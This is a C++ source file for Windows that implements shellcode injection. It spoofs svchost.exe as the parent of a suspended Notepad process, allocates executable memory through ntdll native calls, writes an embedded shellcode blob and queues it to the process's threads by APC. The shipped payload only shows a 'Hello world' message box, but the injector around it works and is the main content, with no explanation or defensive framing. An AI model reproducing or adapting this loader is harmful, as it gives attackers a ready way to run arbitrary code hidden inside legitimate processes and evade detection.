#include <iostream>
#include <Windows.h>
#include <vector>
#include <TlHelp32.h>
#include <winternl.h>

using namespace std;

char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

typedef NTSTATUS(NTAPI* ftNtAllocateVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG                ZeroBits,
    IN OUT PSIZE_T          RegionSize,
    IN ULONG                AllocationType,
    IN ULONG                Protect
    );

typedef NTSTATUS(NTAPI* ftNtWriteVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
    );

typedef NTSTATUS(NTAPI* ftNtQueueApcThread)(
    IN HANDLE               ThreadHandle,
    IN PIO_APC_ROUTINE      ApcRoutine,
    IN PVOID                ApcRoutineContext OPTIONAL,
    IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
    IN ULONG                ApcReserved OPTIONAL
    );

typedef struct {
    ftNtAllocateVirtualMemory NtAllocateVirtualMemory;
    ftNtWriteVirtualMemory NtWriteVirtualMemory;
    ftNtQueueApcThread NtQueueApcThread;
} ntdll;

vector<HANDLE> GetProcessThreads(DWORD processId) {
    vector<HANDLE> threads;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return threads;
    }

    if (Thread32First(snapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (hThread != NULL) {
                    threads.push_back(hThread);
                }
            }
        } while (Thread32Next(snapshot, &te32));
    }

    CloseHandle(snapshot);
    return threads;
}

HANDLE GetSvchostProcessHandle() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &process_entry)) {
        CloseHandle(snapshot);
        return NULL;
    }

    do {
        if (wcscmp(process_entry.szExeFile, L"svchost.exe") == 0) {
            HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry.th32ProcessID);
            if (process_handle != NULL) {
                CloseHandle(snapshot);
                return process_handle;
            }
        }
    } while (Process32Next(snapshot, &process_entry));

    CloseHandle(snapshot);
    return NULL;
}

HANDLE CreateProcess2() {
    STARTUPINFOEXA startup_info;
    ZeroMemory(&startup_info, sizeof(STARTUPINFOEXA));
    startup_info.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    PROCESS_INFORMATION process_info;
    ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));

    SIZE_T proc_attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &proc_attr_size);
    if (proc_attr_size == 0) {
        std::cout << "Error list size" << std::endl;
        return NULL;
    }

    PPROC_THREAD_ATTRIBUTE_LIST proc_attr_list = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, proc_attr_size);
    if (!proc_attr_list) {
        std::cout << "failed to allocate memory for attribute list" << std::endl;
        return NULL;
    }

    if (!InitializeProcThreadAttributeList(proc_attr_list, 1, 0, &proc_attr_size)) {
        std::cout << "failed to initialize attribute list" << std::endl;
        HeapFree(GetProcessHeap(), 0, proc_attr_list);
        return NULL;
    }

    HANDLE parent_handle = GetSvchostProcessHandle();
    if (!parent_handle) {
        std::cout << "failed to get process handle" << std::endl;
        DeleteProcThreadAttributeList(proc_attr_list);
        HeapFree(GetProcessHeap(), 0, proc_attr_list);
        return NULL;
    }

    if (!UpdateProcThreadAttribute(proc_attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent_handle, sizeof(HANDLE), NULL, NULL)) {
        std::cout << "failed to update attribute list" << std::endl;
        CloseHandle(parent_handle);
        DeleteProcThreadAttributeList(proc_attr_list);
        HeapFree(GetProcessHeap(), 0, proc_attr_list);
        return NULL;
    }

    startup_info.lpAttributeList = proc_attr_list;

    if (!CreateProcessA(
        NULL,
        (LPSTR)"C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2404.10.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &startup_info.StartupInfo,
        &process_info
    )) {
        std::cout << "createprocess failed" << std::endl;
        CloseHandle(parent_handle);
        DeleteProcThreadAttributeList(proc_attr_list);
        HeapFree(GetProcessHeap(), 0, proc_attr_list);
        return NULL;
    }

    CloseHandle(parent_handle);
    DeleteProcThreadAttributeList(proc_attr_list);
    HeapFree(GetProcessHeap(), 0, proc_attr_list);

    return process_info.hProcess;
}

int HijackThread(HANDLE process, vector<HANDLE> threads) {
    ntdll ntdll;
    PVOID alloc_mem = NULL;
    SIZE_T region_size = sizeof(shellcode);

    ntdll.NtWriteVirtualMemory = (ftNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtWriteVirtualMemory");
    if (!ntdll.NtWriteVirtualMemory) {
        return 1;
    }

    ntdll.NtAllocateVirtualMemory = (ftNtAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (!ntdll.NtAllocateVirtualMemory) {
        return 1;
    }

    ntdll.NtQueueApcThread = (ftNtQueueApcThread)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueueApcThread");
    if (!ntdll.NtQueueApcThread) {
        return 1;
    }

    NTSTATUS status = ntdll.NtAllocateVirtualMemory(process, &alloc_mem, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cout << "failed with status: " << std::hex << status << std::endl;
        return 1;
    }

    DWORD oldproc = 0;
    if (!VirtualProtectEx(process, alloc_mem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldproc)) {
        return 1;
    }

    ntdll.NtWriteVirtualMemory(process, alloc_mem, shellcode, sizeof(shellcode), NULL);

    for (HANDLE& thread : threads) {
        ntdll.NtQueueApcThread(thread, (PIO_APC_ROUTINE)alloc_mem, NULL, NULL, NULL);
        ResumeThread(thread);
        CloseHandle(thread);
    }

    CloseHandle(process);
    return 0;
}

int main() {
    HANDLE hProcess = CreateProcess2();
    if (hProcess == NULL) {
        std::cout << "failed to create process" << std::endl;
        return 1;
    }

    vector<HANDLE> threads = GetProcessThreads(GetProcessId(hProcess));
    if (threads.empty()) {
        std::cout << "no threads found for process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (HijackThread(hProcess, threads) != 0) {
        std::cout << "failed to hijack thread" << std::endl;
        return 1;
    }

    TerminateProcess(CreateProcess2(), NULL);
    return 0;
}
